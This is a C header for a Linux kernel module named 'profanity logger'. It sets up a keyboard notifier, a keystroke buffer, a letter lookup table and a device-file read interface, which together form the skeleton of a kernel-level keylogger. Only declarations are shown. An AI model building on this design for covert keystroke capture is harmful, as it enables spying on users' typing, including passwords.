#ifndef PROFANITY_LOGGER_H
#define PROFANITY_LOGGER_H 

#include <linux/fs.h> // for file handling
#include <linux/types.h>
#include <linux/module.h> // for module loading/cleaning
#include <linux/keyboard.h> // for keyboard handling
#include <linux/input.h> // for key macros, etc

#define BUFFLEN     8000 // buffer length (memory conscious)
#define FIRST_KEY   KEY_Q // only handling letters 
#define LAST_KEY    KEY_M   
#define UND_CHAR    ','

void debugPrint(int);

// Create buffer (and pointer to it) with memory consumption throttling
char buffer[BUFFLEN+1];
char* buffPtr = buffer;
const char* endPtr = (buffer + sizeof(buffer)-1);
// Used as a mapping of input.h macro definitions
// UND_CHAR used for keys not capturing
const char lookupTable[] = {'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o',
			 'p', UND_CHAR, UND_CHAR, UND_CHAR, UND_CHAR, 'a', 's', 'd', 'f', 'g',
			 'h', 'j', 'k', 'l', UND_CHAR, UND_CHAR, UND_CHAR, UND_CHAR,
			 UND_CHAR, 'z', 'x', 'c', 'v', 'b', 'n', 'm'};

// For a bit of overhead optimization make inline
inline char getASCII(int code) 
{
	// If the code is out of our bounds of interest
	if (code < FIRST_KEY || code > LAST_KEY)
	{
		return UND_CHAR;
	}
	
	// Difference between code and FIRST_KEY gives us lookupTable index
	return lookupTable[(code-FIRST_KEY)];
}

static int __init pl_init(void);
static void __exit pl_exit(void);
int pl_open(struct inode *inode, struct file *filp);
// ssize_t is in types.h
ssize_t pl_read(struct file *filp, char *buf, size_t count, loff_t *f_pos);
int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* param);

// Create struct for file handling with correct functions
struct file_operations pl_fops = {
  .owner = THIS_MODULE,
  .read = pl_read,
  .open = pl_open
};

// Used for keyboard registration
struct notifier_block nb = {
  .notifier_call = kbd_notifier
};

#endif
